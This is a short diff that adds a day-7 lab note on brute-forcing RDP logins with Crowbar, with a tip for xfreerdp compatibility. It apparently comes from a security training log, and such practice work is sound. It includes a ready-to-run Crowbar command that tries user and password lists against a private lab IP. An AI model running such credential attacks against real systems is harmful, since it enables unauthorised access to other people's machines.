@@ -1,0 +1,10 @@
+Day 7 - Brute Force Attack on Target PC
+----------------------------------------
+
+Tools : Crowbar, RDP (Remote Desktop Protocol), xfreerdp
+
+Troubleshooting : Create symbolic linkof xfreerdp to xfreerdp3
+                  (crowbar still uses xfreerdp from /usr/bin)
+
+                  crowbar -b rdp -U users.txt -C passwords.txt -s 192.168.20.100
+                  * command does not rdp with users jsmith and tsmith * 
